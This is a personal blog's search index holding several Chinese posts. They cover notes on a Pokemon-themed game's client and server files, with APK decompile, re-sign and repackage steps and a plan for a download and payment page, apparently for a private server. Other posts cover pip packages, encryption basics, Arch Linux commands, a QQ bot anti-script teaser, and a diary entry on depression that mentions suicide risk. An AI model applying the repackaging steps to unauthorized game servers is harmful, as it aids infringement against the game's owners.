<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>pokemon文档</title>
      <link href="/NANABLOG/2024/10/13/pokemon%E6%96%87%E6%A1%A3/"/>
      <url>/NANABLOG/2024/10/13/pokemon%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>目前我还没有做一个详细的整理，阅读体验可能有些糟糕，请见谅，如果发现写的地方不对可以联系我更改 也可以将自己研究结果发给我统一进行整理更新</p><h2 id="version-plist"><a href="#version-plist" class="headerlink" title="version.plist"></a>version.plist</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;key&gt;app_version&lt;/key&gt;：应用程序的版本号，这里显示为2.1.0.3。</span><br><span class="line">&lt;key&gt;git_version&lt;/key&gt;：Git版本号，这里显示为GIT_VERSION，这通常是一个占位符，实际值可能在构建过程中被替换。</span><br><span class="line">&lt;key&gt;loginServer&lt;/key&gt; 和 &lt;key&gt;loginServer2&lt;/key&gt;：登录服务器的IP地址和端口，这里都是111.173.117.33:16666。</span><br><span class="line">&lt;key&gt;patch&lt;/key&gt;：补丁版本号，这里显示为4。</span><br><span class="line">&lt;key&gt;serverUrl&lt;/key&gt;、&lt;key&gt;versionUrl&lt;/key&gt;、&lt;key&gt;noticeUrl&lt;/key&gt;、&lt;key&gt;reportUrl&lt;/key&gt;、&lt;key&gt;disableWordCheckUrl&lt;/key&gt;、&lt;key&gt;feedBackUrl&lt;/key&gt;：这些都是服务器的URL地址，用于应用程序与后端服务通信。这些URL都指向了同一个IP地址111.173.117.33，但端口和路径不同，以提供不同的服务。</span><br></pre></td></tr></tbody></table></figure><h1 id="文件夹的意义"><a href="#文件夹的意义" class="headerlink" title="文件夹的意义"></a>文件夹的意义</h1><h2 id="口袋前端工程文件"><a href="#口袋前端工程文件" class="headerlink" title="口袋前端工程文件"></a>口袋前端工程文件</h2><h3 id="cocos"><a href="#cocos" class="headerlink" title="cocos"></a>cocos</h3><p>看不懂</p><h3 id="res"><a href="#res" class="headerlink" title="res"></a>res</h3><p>资源文件</p><h4 id="img"><a href="#img" class="headerlink" title="img"></a>img</h4><p>图片</p><h4 id="resources"><a href="#resources" class="headerlink" title="resources"></a>resources</h4><p>资源文件，里面包含了actvicy(活动)，推测是游戏里所有活动的美术资源文件，battle(对战)，推测是游戏里所有战斗相关的美术资源文件，city(城市)，推测是主页里相关的美术资源文件，common(公共的)推测是在各个地方都可能被使用的美术资源，config(配置资源)，里面有表情包，活动图，宠物立绘，人物立绘，UP池活动图，图标等等，font(字体)，数字样式和字体文件,loading(加载界面图),login(登陆)，登陆界面相关的美术资源，lushi(？)，这名字啥意思，但里面是一些按钮和图标样式，难道是某一个新活动？炉石？,other(其他)，其他乱七八糟的美术素材,partcle(零件),里面有一些json文件和图片,暂时看不出来是干什么用的</p><h4 id="shader"><a href="#shader" class="headerlink" title="shader"></a>shader</h4><p>着色器</p><h4 id="sound"><a href="#sound" class="headerlink" title="sound"></a>sound</h4><p>音频</p><h4 id="spine"><a href="#spine" class="headerlink" title="spine"></a>spine</h4><p>骨骼动画</p><h4 id="spine-dev"><a href="#spine-dev" class="headerlink" title="spine_dev"></a>spine_dev</h4><p>特效</p><h4 id="town"><a href="#town" class="headerlink" title="town"></a>town</h4><p>城镇 地图 墙 地板</p><h4 id="uijson"><a href="#uijson" class="headerlink" title="uijson"></a>uijson</h4><p>通常指的是一种用于描述用户界面（UI）元素的 JSON 格式文件</p><p>没看出来，问了AI</p><h4 id="video"><a href="#video" class="headerlink" title="video"></a>video</h4><p>视频，里面只有开头动画</p><h3 id="src"><a href="#src" class="headerlink" title="src"></a>src</h3><p>???</p><h3 id="updater"><a href="#updater" class="headerlink" title="updater"></a>updater</h3><p>更新相关</p><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p>64位兼容</p><h3 id="loading-jpg"><a href="#loading-jpg" class="headerlink" title="loading.jpg"></a>loading.jpg</h3><p>载入防沉迷声明图</p><h3 id="TivicloudSDK-xml"><a href="#TivicloudSDK-xml" class="headerlink" title="TivicloudSDK.xml"></a>TivicloudSDK.xml</h3><p>配置文件</p><ol><li>根元素 <code>&lt;TivicloudSDK&gt;</code>：<ul><li>这是 XML 文件的根元素，表示该文件是与 Tivicloud SDK 相关的配置。</li></ul></li><li><code>&lt;RunConfig&gt;</code> 元素：<ul><li>这个元素包含了应用程序的运行配置，包括：<ul><li><code>appId</code>：应用的唯一标识符。</li><li><code>appKey</code>：用于身份验证的密钥。</li><li><code>appName</code>：应用的名称。</li><li><code>channelId</code>：渠道 ID，可能用于区分不同的发布渠道。</li><li><code>platformId</code>：平台 ID，通常用于标识应用运行的平台（如 Android、iOS 等）。</li><li><code>checkVersion</code>：是否检查版本更新的标志。</li><li><code>debug</code>：是否启用调试模式的标志。</li><li><code>extraSDK</code>：额外的 SDK 配置（如果有的话）。</li><li><code>screenOrientation</code>：屏幕方向设置（如横屏或竖屏）。</li><li><code>language</code>：应用的语言设置。</li><li><code>hostAddress</code>：服务器地址，可能用于 API 调用或数据同步。</li><li><code>openPermission</code>：是否开启权限请求。</li></ul></li></ul></li><li><strong><code>&lt;Permissions&gt;</code> 元素</strong>：<ul><li>这个元素定义了应用所需的权限及其说明：<ul><li><code>READ_PHONE_STATE</code>：允许游戏读取手机状态。</li><li><code>PUSH</code>：允许游戏推送通知消息。</li></ul></li></ul></li></ol><h2 id="后端工程文件"><a href="#后端工程文件" class="headerlink" title="后端工程文件"></a>后端工程文件</h2><p>后端里的游戏数据库路径</p><p>D:\pokemon\原版后端\pokemon_server\pokemon_src\release\anti_cheat\game_config</p><p>我目前的理解是，使用pokemon_server在服务器上运行后，开始自动创建数据库和相关的接口，然后前端也就是客户端要设置后端服务器的ip地址和端口，最后进行互连，数据交互。</p><p>至于源码表只是用来让管理者阅读的，然后方便开启各种不同的活动和进行修改，管理员找到需要修改的表后，修改完成然后生成新的文件，按照规则放到对应的后端目录，通过重置后端会自动进行更新，然后客户端也会收到信号进行和后端的同步更新</p><p>将反编译后的 APK 代码更改后，重新编译回 APK 的过程通常包括以下几个步骤。请注意，这个过程需要一些工具和对 Android 开发的基本了解。</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><ol><li><p><strong>反编译 APK</strong>：</p><ul><li><p>使用工具如</p><p>APKTool</p><p>反编译 APK 文件：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">apktool d your_app.apk</span><br></pre></td></tr></tbody></table></figure></li><li><p>这将创建一个文件夹，包含反编译后的资源和代码。</p></li></ul></li><li><p><strong>修改代码</strong>：</p><ul><li>在反编译后的文件夹中，找到需要修改的 Java 代码（通常在 <code>smali</code> 文件夹中）或资源文件（如 XML 文件），进行相应的更改。</li></ul></li><li><p><strong>重新编译 APK</strong>：</p><ul><li><p>使用</p><p>APKTool</p><p>重新编译修改后的文件夹：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">apktool b your_app_folder -o new_app.apk</span><br></pre></td></tr></tbody></table></figure></li><li><p>这将生成一个新的 APK 文件 <code>new_app.apk</code>。</p></li></ul></li><li><p><strong>签名 APK</strong>：</p><ul><li><p>由于修改后的 APK 需要重新签名才能安装在设备上，可以使用 <strong>jarsigner</strong> 或 <strong>apksigner</strong> 工具进行签名。</p></li><li><p>如果你没有自己的密钥，可以使用以下命令生成一个新的密钥库：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">keytool -genkey -v -keystore my-release-key.keystore -<span class="built_in">alias</span> alias_name -keyalg RSA -keysize 2048 -validity 10000</span><br></pre></td></tr></tbody></table></figure></li><li><p>然后使用</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">apksigner</span><br></pre></td></tr></tbody></table></figure><p>签名 APK：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">apksigner sign --ks my-release-key.keystore --out signed_new_app.apk new_app.apk</span><br></pre></td></tr></tbody></table></figure></li></ul></li><li><p><strong>安装 APK</strong>：</p><ul><li><p>将签名后的 APK 安装到 Android 设备上：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">adb install signed_new_app.apk</span><br></pre></td></tr></tbody></table></figure></li></ul></li></ol><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>反编译和修改 APK 可能违反软件的使用条款</strong>，请确保你有权进行这些操作。</li><li>反编译后的代码可能会丢失一些信息（如注释），并且可能需要对 <code>smali</code> 代码有一定的了解。</li><li>确保在修改代码时遵循 Android 的开发规范，以避免运行时错误。</li><li>如果 APK 使用了 ProGuard 混淆，反编译后的代码可能会比较难以理解。</li></ul><p>通过以上步骤，你应该能够成功地将修改后的代码编译回 APK 文件并在 Android 设备上安装。</p><p>我已经了解了你的项目概况。以下是我的分析和总结：</p><p><strong>项目概况</strong></p><ul><li>项目源码分为前端代码和后端代码</li><li>前端代码（客户端）需要修改服务器配置文件以指向后端服务器的IP地址</li><li>后端代码需要搭建三个页面：<ol><li>下载页面：提供游戏下载和更新功能，需要将前端代码修改后打包为APK文件并上传到CDN直连云盘上</li><li>游戏内充值页面：处理游戏内交易和支付功能，具体实现细节不清楚</li><li>游戏服务器页面：提供游戏核心功能和数据交互</li></ol></li></ul><p><strong>后端组件</strong></p><ul><li>数据库：使用宝塔自带的MySQL数据库，存储游戏数据和用户信息</li><li>服务器进程：包括game_server、gm_server、login_server等多个进程，负责游戏逻辑、管理和用户认证等功能</li><li>API接口：提供多个API接口，用于数据交互和游戏核心功能实现</li></ul><p><strong>关键点</strong></p><ul><li>前端代码需要修改服务器配置文件以指向后端服务器的IP地址</li><li>后端代码需要搭建三个页面，包括下载页面、游戏内充值页面和游戏服务器页面</li><li>数据库和服务器进程是游戏核心功能的关键组件</li><li>API接口提供了数据交互和游戏核心功能实现的途径</li></ul><p>我希望这份分析能够帮助你更好地理解项目的整体架构和逻辑。如果你有任何进一步的问题或需要更多帮助，请随时问我！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 网游 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pip依赖管理文档</title>
      <link href="/NANABLOG/2024/10/08/pip%E4%BE%9D%E8%B5%96%E7%AE%A1%E7%90%86%E6%96%87%E6%A1%A3/"/>
      <url>/NANABLOG/2024/10/08/pip%E4%BE%9D%E8%B5%96%E7%AE%A1%E7%90%86%E6%96%87%E6%A1%A3/</url>
      
        <content type="html"><![CDATA[<p>最近我在使用python写一个宠物捕捉的自动化脚本，需要使用pip下载很多的依赖，但当一些依赖你长时间不在使用，可能就忘记了存在，所以这里我会将我学习过的库的理解和使用方法做一个简单的说明，方便之后当我 pip list 的时候知道每个库的功能。</p><p>当然如果需要清理内存也可以删除。</p><h3 id="pip-install-kivy-buildozer"><a href="#pip-install-kivy-buildozer" class="headerlink" title="pip install kivy buildozer"></a>pip install kivy buildozer</h3><p>Kivy 是一个用于开发多点触控应用程序的开源 Python 库，可以轻松创建跨平台应用，包括 Android。</p><p>Kivy 提供了一个工具叫做 <code>Buildozer</code>，可以帮助您将 Kivy 项目打包为 APK。</p><h3 id="pyinstaller"><a href="#pyinstaller" class="headerlink" title="pyinstaller"></a>pyinstaller</h3><p><strong>PyInstaller</strong> 是一个用于将 Python 程序打包成独立可执行文件的工具。它支持多种操作系统，包括 Windows、macOS 和 Linux。使用 PyInstaller，您可以将您的 Python 代码、依赖库和必要的数据文件一起打包，以便在不需要安装 Python 环境的情况下直接运行。</p>]]></content>
      
      
      
        <tags>
            
            <tag> pip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自制压缩加密程序学习笔记</title>
      <link href="/NANABLOG/2024/10/07/%E8%87%AA%E5%88%B6%E5%8E%8B%E7%BC%A9%E5%8A%A0%E5%AF%86%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/10/07/%E8%87%AA%E5%88%B6%E5%8E%8B%E7%BC%A9%E5%8A%A0%E5%AF%86%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="1-压缩（Compression）"><a href="#1-压缩（Compression）" class="headerlink" title="1. 压缩（Compression）"></a>1. 压缩（Compression）</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>压缩的目的是减少数据的存储空间或传输带宽。通过去掉冗余信息，压缩算法可以将文件的大小显著减小。</p><h4 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h4><ul><li><strong>无损压缩</strong>：在这种方法中，压缩后可以完全还原原始数据。例如 ZIP、PNG 等格式。处理过程中不会丢失任何信息。</li><li><strong>有损压缩</strong>：这种方法会丢弃一些不重要的信息，以达到更高的压缩比。例如 JPEG 图像和 MP3 音频。</li></ul><h4 id="常见算法"><a href="#常见算法" class="headerlink" title="常见算法"></a>常见算法</h4><ul><li><strong>Huffman 编码</strong>：基于字符频率生成固定长度或变长的二进制编码，频繁出现的字符使用较短的编码，从而达到压缩效果。</li><li><strong>LZ78 和 LZW</strong>：这些算法通过查找重复的字符串模式并用短代码替换它们来实现有效压缩。</li></ul><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>假设有一个字符串 “AAAAABBBCCDAA”：</p><ul><li>无损压缩可能将其压缩为 “5A3B2C1D2A”，表示5个A，3个B，2个C，1个D，2个A。</li></ul><h3 id="2-加密（Encryption）"><a href="#2-加密（Encryption）" class="headerlink" title="2. 加密（Encryption）"></a>2. 加密（Encryption）</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>加密的目的是保护数据的机密性，使只有被授权的用户才能读取数据。加密算法通过某种方式改变数据，使得未授权的人无法理解。</p><h4 id="类型-1"><a href="#类型-1" class="headerlink" title="类型"></a>类型</h4><ul><li><strong>对称加密</strong>：加密和解密都使用相同的密钥，如 AES、DES。速度快，但密钥管理是个挑战。</li><li><strong>非对称加密</strong>：使用一对密钥，公钥用于加密，私钥用于解密，如 RSA。虽然相对慢，但安全性高，适合公开通信。</li></ul><h4 id="常见算法-1"><a href="#常见算法-1" class="headerlink" title="常见算法"></a>常见算法</h4><ul><li><strong>AES（高级加密标准）</strong>：一种广泛使用的对称加密算法，使用128位、192位或256位密钥，安全性高且快速。</li><li><strong>RSA</strong>：一种常见的非对称加密算法，通常用于安全的数据传输。</li></ul><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>假设您使用 AES 对字符串 “Hello, World!” 进行加密，使用一个密钥 <code>mysecretkey</code>：</p><ul><li>加密后的结果可能是一串看似随机的字节，比如 <code>XzF8j9&amp;...</code>，此时没有密钥的人无法解读这个数据。</li></ul><h3 id="综合示例"><a href="#综合示例" class="headerlink" title="综合示例"></a>综合示例</h3><p>假设您要处理一个文本文件，其中包含了一些敏感信息：</p><ol><li><strong>首先，加密内容</strong>：<ul><li>使用 AES 算法和密钥将文件内容转换成不可读的格式。</li></ul></li><li><strong>然后，压缩加密后的内容</strong>：<ul><li>使用如 zlib 的无损压缩算法进一步减小加密数据的大小。</li></ul></li><li><strong>最终输出</strong>：<ul><li>将压缩后的数据写入一个文件（例如 <code>.slth</code>），并在文件开头附加必要的元数据，例如使用的加密算法、密钥长度等。</li></ul></li></ol><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li><strong>压缩</strong> 是为了节省空间和提高传输效率，通过消除冗余信息实现。</li><li><strong>加密</strong> 是为了保护数据安全，使得只有拥有正确密钥的人才能访问数据。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虽然面无表情，但内心却总是在哭泣</title>
      <link href="/NANABLOG/2024/09/29/%E8%99%BD%E7%84%B6%E9%9D%A2%E6%97%A0%E8%A1%A8%E6%83%85%E4%BD%86%E5%86%85%E5%BF%83%E5%8D%B4%E6%80%BB%E6%98%AF%E5%9C%A8%E5%93%AD%E6%B3%A3/"/>
      <url>/NANABLOG/2024/09/29/%E8%99%BD%E7%84%B6%E9%9D%A2%E6%97%A0%E8%A1%A8%E6%83%85%E4%BD%86%E5%86%85%E5%BF%83%E5%8D%B4%E6%80%BB%E6%98%AF%E5%9C%A8%E5%93%AD%E6%B3%A3/</url>
      
        <content type="html"><![CDATA[<p>有时候，我不知道自己为什么要那么悲伤，对自己那么刻薄，我总是感觉很绝望，周围的一切都那么”冷”，小时候，家里没有钱交暖气费，所以每次到冬天都很冷，只能穿上厚厚的衣服，躲在被窝里，虽然天气冷，但妈妈的爱却一直有温暖到我，之后它们买了一个电热机，插电就可以吹出热风，在爸妈出去务工的时候，我一个人靠这个才在寒冷的冬天活下来，当然，它真的很费电。</p><p>关于我为什么每天都活在抑郁和自卑中，我给自己的解释有很多，家庭原因，政治原因，在学校被霸凌过等。这些小小的因素不断的积累，最终形成了这样的我。</p><p>我很讨厌周围的一切，这样的小县城，人们讲着粗话却毫不羞涩，相互内战却不知道敌人是谁，活在没有希望，一辈子被奴役却毫不知情的世界，我不喜欢出去工作，因为老板总是想要压榨他人，拿着在低不过的工资，却命令人做这，做那，这太不合理了。</p><p>在周围亲戚看来，工作被分为三六九等，仿佛只有考公才是唯一的出路，是可以被拿上台面的工作，如果我去当个服务员，清洁员，那么就会被看不起，这太不公平了，明明都是靠汗水和努力得到的钱。</p><p>网络环境也是，每次想要发表一些什么，就会被互联网审查不通过，那些悲伤的内容也是，明明没有涉及政治，只是想抒发下情感都不被允许，让人感到压抑。</p><p>随和年龄长大，以前的朋友也不在联系，我有时候很怀念以前那纯粹的友谊，但都不复存在了。</p><p>就这样，我一个人孤零零的，活在这个世界上，我不在期待于他人社交，我在网上查询，这样的状态很容易抑郁，甚至有轻生的可能性，我明白的，但我依然已经让自己和现实的一切割裂。</p><p>因为我累了，我宁愿把时间花费在我想要花费的地方，也不愿意在迎合别人了。</p><p>就这样，就连这样阴暗的自言自语写的这篇文章，也可能这辈子没人能看到。</p><p>如果现在有人能够读到这里，我还是感到很欣慰和…感动的，但我不敢想。</p><p>但我也看的开明了，那些本来不存在的道路，我会自己去开辟，如果不想要受控于他人，就要将自己所有的精力都用在这里，和人无法交谈？或许也只是没有遇到合适的人和社群，我以后会花费更多的精力去运营，去组件自己的避难所，让同样和悲伤，苦恼的人儿有一个去处。</p>]]></content>
      
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Stylus美化Bilbili_Web样式记录笔记</title>
      <link href="/NANABLOG/2024/09/28/%E4%BD%BF%E7%94%A8Stylus%E7%BE%8E%E5%8C%96Bilbili-Web%E6%A0%B7%E5%BC%8F%E8%AE%B0%E5%BD%95%E7%AC%94%E8%AE%B0/"/>
      <url>/NANABLOG/2024/09/28/%E4%BD%BF%E7%94%A8Stylus%E7%BE%8E%E5%8C%96Bilbili-Web%E6%A0%B7%E5%BC%8F%E8%AE%B0%E5%BD%95%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>今天打开Bilibili，发现之前使用的夜晚模式样式失效了，我推测可能是因为页面更新后导致部分样式无法生效。</p><p>由此我决定自己编写一个样式插件，顺便记录方便日后复习。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于一念成仙QQ机器人的研究攻略</title>
      <link href="/NANABLOG/2024/09/23/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%BF%B5%E6%88%90%E4%BB%99QQ%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E7%A0%94%E7%A9%B6%E6%94%BB%E7%95%A5/"/>
      <url>/NANABLOG/2024/09/23/%E5%85%B3%E4%BA%8E%E4%B8%80%E5%BF%B5%E6%88%90%E4%BB%99QQ%E6%9C%BA%E5%99%A8%E4%BA%BA%E7%9A%84%E7%A0%94%E7%A9%B6%E6%94%BB%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<p>自从腾讯大战民间QQ机器人失败后，终于决定自己开放相关API和平台，虽然制定了一些规则导致无法像以前那么自由，但至少不用担心被封号了。</p><p>最近热衷于一念成仙的QQ机器人文字类游戏，但让我想要出这份攻略的契机是，当我想要写一个脚本帮助我快速点击修仙按钮解放双手的时候，我发现作者竟然为此做了防御，如果你细心，你会注意到每次@机器人发送修仙后，当你休闲完成会弹出继续修炼和修炼帮助两个按钮，而这两个按钮是会随机变化的，这明显是为了防止那些简单脚本刷灵力。</p><p>但其实还是有解决办法，只是绕一点罢了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> qq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ArchLinux基础命令</title>
      <link href="/NANABLOG/2024/09/23/ArchLinux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"/>
      <url>/NANABLOG/2024/09/23/ArchLinux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="Arch-Linux-简介"><a href="#Arch-Linux-简介" class="headerlink" title="Arch Linux 简介"></a>Arch Linux 简介</h2><p><strong>Arch Linux</strong> 是一个轻量级的、灵活的 Linux 发行版，以简洁性和KISS原则（Keep It Simple, Stupid）为设计理念。它主要面向高级用户，为他们提供了一个高度可定制的环境。Arch Linux 不仅适合那些希望深入理解 Linux 的用户，还鼓励用户根据自己的需求进行系统配置。</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>下载官方ios</p><p><a href="https://archlinux.org/download/">https://archlinux.org/download/</a></p><p>下载完成后烧录到U盘,我使用的烧录软件是:balenaEtcher-Portable-1.18.11.exe</p><p>烧录完成后，插入U盘，不同的电脑型号不同，我的是F8进入引导界面选择USB</p><p>开始进入引导安装界面，这里提供两种方法安装，自定义安装和快速安装，这里演示快速安装</p><p>首先使用iwctl进行连接wif</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">iwctl</span><br><span class="line">device list</span><br><span class="line">station wlan0 scan</span><br><span class="line">station wlan0 get-networks</span><br><span class="line">station wlan0 connect SSID</span><br><span class="line">exit</span><br><span class="line">archlinux install</span><br></pre></td></tr></tbody></table></figure><p>输入 archlinux install后会自动下载一段时间，然后进入界面配置，配置完成后会自动进行安装，等待即可</p><h3 id="系统更新"><a href="#系统更新" class="headerlink" title="系统更新"></a>系统更新</h3><ul><li><p><code>pacman</code></p><p>：Arch Linux 的包管理器，用于安装、卸载和管理软件包。</p><ul><li><p>更新系统：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -Syu</span><br></pre></td></tr></tbody></table></figure></li><li><p>安装软件包：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S package_name</span><br></pre></td></tr></tbody></table></figure></li><li><p>卸载软件包：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -R package_name</span><br></pre></td></tr></tbody></table></figure></li><li><p>查找软件包：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">pacman -Ss keyword</span><br></pre></td></tr></tbody></table></figure></li></ul></li></ul><h3 id="文件和目录操作"><a href="#文件和目录操作" class="headerlink" title="文件和目录操作"></a>文件和目录操作</h3><ul><li><p>**<code>ls</code>**：列出当前目录的文件和子目录。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">ls</span> -l      <span class="comment"># 详细列表</span></span><br><span class="line"><span class="built_in">ls</span> -a      <span class="comment"># 包含隐藏文件</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>**<code>cd</code>**：改变当前目录。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /path/to/directory</span><br></pre></td></tr></tbody></table></figure></li><li><p>**<code>pwd</code>**：显示当前工作目录。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>**<code>mkdir</code>**：创建新目录。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> new_directory</span><br></pre></td></tr></tbody></table></figure></li><li><p>**<code>rm</code>**：删除文件或目录。</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> file.txt               <span class="comment"># 删除文件</span></span><br><span class="line"><span class="built_in">rm</span> -r directory_name       <span class="comment"># 递归删除目录</span></span><br></pre></td></tr></tbody></table></figure></li></ul><h3 id="Rofi来打开软件窗口"><a href="#Rofi来打开软件窗口" class="headerlink" title="Rofi来打开软件窗口"></a>Rofi来打开软件窗口</h3><p>在 Arch Linux 及其他 Linux 发行版中，<strong>Rofi</strong> 是一个非常流行的应用程序启动器和窗口管理器。它主要用于替代默认的 <code>dmenu</code>，并提供了一种更灵活、更用户友好的方式来访问应用程序、窗口和文件。</p><h3 id="Rofi-的主要特点"><a href="#Rofi-的主要特点" class="headerlink" title="Rofi 的主要特点"></a>Rofi 的主要特点</h3><ol><li><strong>应用程序启动器</strong>：Rofi 可以用来快速启动已安装的应用程序，非常适合那些喜欢键盘操作的用户。</li><li><strong>窗口切换器</strong>：Rofi 可列出当前打开的窗口，让用户能够快速切换到所需的窗口。</li><li><strong>自定义</strong>：Rofi 支持主题和配置文件，可以根据用户的需求进行高度定制，包括外观和行为。</li><li><strong>快捷搜索</strong>：通过输入关键字，Rofi 可以快速过滤出匹配的应用程序或窗口，使得查找变得更加高效。</li><li><strong>多种模式</strong>：Rofi 提供不同的模式，如运行模式、窗口模式、ssh 模式等，满足不同的使用场景。</li><li><strong>可扩展性</strong>：用户可以扩展 Rofi 的功能，通过脚本或插件实现更多自定义功能。</li></ol><h3 id="如何安装-Rofi"><a href="#如何安装-Rofi" class="headerlink" title="如何安装 Rofi"></a>如何安装 Rofi</h3><p>在 Arch Linux 上，你可以通过 <code>pacman</code> 包管理器安装 Rofi：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S rofi</span><br></pre></td></tr></tbody></table></figure><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>安装完成后，你可以通过在终端中输入 <code>rofi</code> 来启动它。例如，如果你想使用 Rofi 作为应用程序启动器，可以在终端中执行：</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">rofi -show run</span><br></pre></td></tr></tbody></table></figure><p>这将打开 Rofi，并允许你输入要启动的应用程序名称。</p><h3 id="Nano"><a href="#Nano" class="headerlink" title="Nano"></a>Nano</h3><h3 id="1-使用-Nano-编辑器"><a href="#1-使用-Nano-编辑器" class="headerlink" title="1. 使用 Nano 编辑器"></a>1. 使用 Nano 编辑器</h3><p><code>nano</code> 是一个简单易用的命令行文本编辑器。</p><h4 id="安装-Nano（如果未安装）"><a href="#安装-Nano（如果未安装）" class="headerlink" title="安装 Nano（如果未安装）"></a>安装 Nano（如果未安装）</h4><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> pacman -S nano</span><br></pre></td></tr></tbody></table></figure><h4 id="编辑文件"><a href="#编辑文件" class="headerlink" title="编辑文件"></a>编辑文件</h4><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">nano /path/to/your/file.txt</span><br></pre></td></tr></tbody></table></figure><ul><li>使用箭头键移动光标。</li><li>输入文本进行编辑。</li><li>保存并退出：按 <code>Ctrl + O</code>，然后按 <code>Enter</code> 保存更改；按 <code>Ctrl + X</code> 退出。</li></ul><h3 id="Arch-Linux-目录结构说明"><a href="#Arch-Linux-目录结构说明" class="headerlink" title="Arch Linux 目录结构说明"></a>Arch Linux 目录结构说明</h3><p>Arch Linux 的目录结构遵循 UNIX 文件系统的标准，即 Filesystem Hierarchy Standard (FHS)。下面是 Arch Linux 各个主要目录的功能介绍，以帮助你更好地理解它们的作用。</p><h4 id="1"><a href="#1" class="headerlink" title="1. /"></a>1. <code>/</code></h4><ul><li>**根目录 (Root Directory)**，所有文件和目录的起始点。所有其他目录都位于此目录之下。</li></ul><h4 id="2-bin"><a href="#2-bin" class="headerlink" title="2. /bin"></a>2. <code>/bin</code></h4><ul><li><strong>基本用户命令</strong>存放的地方，包含系统启动和修复所需的二进制可执行文件。例如：<code>ls</code>, <code>cp</code>, <code>mv</code> 等。</li></ul><h4 id="3-boot"><a href="#3-boot" class="headerlink" title="3. /boot"></a>3. <code>/boot</code></h4><ul><li>存放启动加载器（如 GRUB）的文件及内核映像文件。例如：<code>vmlinuz-linux</code> 内核文件和启动加载器配置。</li></ul><h4 id="4-dev"><a href="#4-dev" class="headerlink" title="4. /dev"></a>4. <code>/dev</code></h4><ul><li><strong>设备文件目录</strong>，Linux 系统中一切设备（如硬盘、光驱、USB 设备）都以文件的形式存在于此。例如：<code>/dev/sda1</code> 代表一块硬盘分区。</li></ul><h4 id="5-etc"><a href="#5-etc" class="headerlink" title="5. /etc"></a>5. <code>/etc</code></h4><ul><li><p>系统配置文件目录</p><p>。该目录包含系统的各种配置文件，例如：网络配置、用户账户、守护进程启动配置等。</p><ul><li>常见配置文件：<code>/etc/fstab</code> (文件系统表)、<code>/etc/passwd</code> (用户账户信息)。</li></ul></li></ul><h4 id="6-home"><a href="#6-home" class="headerlink" title="6. /home"></a>6. <code>/home</code></h4><ul><li><strong>用户主目录</strong>，每个普通用户在 <code>/home</code> 